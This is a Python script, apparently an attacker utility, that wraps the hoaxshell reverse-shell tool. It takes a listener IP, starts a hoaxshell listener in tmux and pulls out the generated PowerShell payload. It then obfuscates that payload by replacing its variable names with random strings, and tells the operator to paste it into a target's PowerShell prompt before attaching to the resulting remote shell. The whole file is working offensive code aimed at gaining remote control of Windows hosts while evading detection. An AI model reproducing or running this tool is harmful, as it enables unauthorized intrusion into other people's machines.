import os
import time
from colorama import Fore, Style
import netifaces as ni
import random
import re

print(Fore.RED + """ Built by: sternyx 
             __      __            __        __                           
            |  \    |  \          |  \      |  \                          
  _______  _| $$_    \$$  _______ | $$   __ | $$____   __    __   ______  
 /       \|   $$ \  |  \ /       \| $$  /  \| $$    \ |  \  |  \ /      \ 
|  $$$$$$$ \$$$$$$  | $$|  $$$$$$$| $$_/  $$| $$$$$$$\| $$  | $$|  $$$$$$|
 \$$    \   | $$ __ | $$| $$      | $$   $$ | $$  | $$| $$  | $$| $$  | $$
 _\$$$$$$\  | $$|  \| $$| $$_____ | $$$$$$\ | $$__/ $$| $$__/ $$| $$__| $$
|       $$   \$$  $$| $$ \$$     \| $$  \$$\| $$    $$ \$$    $$ \$$    $$
 \$$$$$$$     \$$$$  \$$  \$$$$$$$ \$$   \$$ \$$$$$$$   \$$$$$$  _\$$$$$$$
                                                                |  \__| $$
                                                                 \$$    $$
                                                                  \$$$$$$ 


special thanks to: 
t3l3machus and his amazing creation of hoaxshell
""" + Style.RESET_ALL)
time.sleep(0.25)


def getAllInterfaces():
    ifaces = ni.interfaces()
    for face in ifaces:
        print(Fore.YELLOW + str(face + ':').ljust(5), ni.ifaddresses(face)[ni.AF_INET][0]['addr'] + Style.RESET_ALL)
        
    listenerIP = input(Fore.BLUE + "\nEnter listener IP: " + Style.RESET_ALL)
        
    if listenerIP in ifaces:
        listenerIP = str(ni.ifaddresses(listenerIP)[ni.AF_INET][0]['addr'])
        print(Fore.BLUE + "Listener IP selected: " + listenerIP + Style.RESET_ALL + "\n")
        time.sleep(0.2)
    global addr
    addr = listenerIP




def hoaxshell():
    # send tmux hoaxshell listener to background
    print("Genterating hoaxshell")
    time.sleep(0.5)
    os.system("tmux new -d -s hoaxshell")
    os.system("tmux send-keys -t hoaxshell 'python3 hoaxshell/hoaxshell.py -s " + addr + " -r | tee /tmp/hoax.txt' ENTER")
    time.sleep(1)
    os.system("cat /tmp/hoax.txt | grep '$s' > /tmp/payload.ps1")
    os.system("rm /tmp/hoax.txt")


    
def Find_psVariables():
    # Find all variables in powershell script
    regex = r'\$[a-zA-Z0-9_]+'

    with open("/tmp/payload.ps1", "r") as f:
        for line in f: 
            v = re.findall(regex, line)
            res = []
            [res.append(x) for x in v if x not in res]
            original = res
            stopwords = ['$true', '$false', '$t']
            found_var = [y for y in original if y not in stopwords]
            global replacements 
            replacements = found_var
    return replacements


def Get_ObfuscatedVariable(replacements):
    new_var = []
    print("Generating variable list")
    time.sleep(0.5)
    for i in replacements:
        new_var.append("$" + ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for _ in range(12)))
    print("New variables generated")
    time.sleep(0.5)


    with open("/tmp/payload.ps1", "r") as f:
        with open("/tmp/obfuscated.ps1", "w") as f1:
            for line in f:
                for src, target in zip(replacements, new_var):
                    line = line.replace(src, target)
                f1.write(line)
    print("Payload obfuscated")
    time.sleep(0.5)




def main():
    getAllInterfaces()
    hoaxshell()
    Find_psVariables()
    Get_ObfuscatedVariable(replacements)

    #Payload creation
    print("Payload saved to /tmp/obfuscated.ps1 \nPayload printing below\n\n")
    os.system("cat /tmp/obfuscated.ps1")
    print("\n" + Fore.RED + "Copy payload to target powershell prompt" + Style.RESET_ALL)
    input("\nPress enter to continue")
    os.system("sudo tmux send-keys -t hoaxshell ENTER")

    #Hoaxshell tmux session
    print("Entering tmux session... \n" + Fore.RED + "\nType 'exit' to exit session\n" + Style.RESET_ALL)
    time.sleep(2.5)
    os.system("sudo tmux a -t hoaxshell")

    #Clean up
    os.system("sudo rm /tmp/payload.ps1 /tmp/obfuscated.ps1")
    os.system("sudo tmux kill-session -t hoaxshell")
    input("Press enter to exit")



if __name__ == "__main__":
    main()
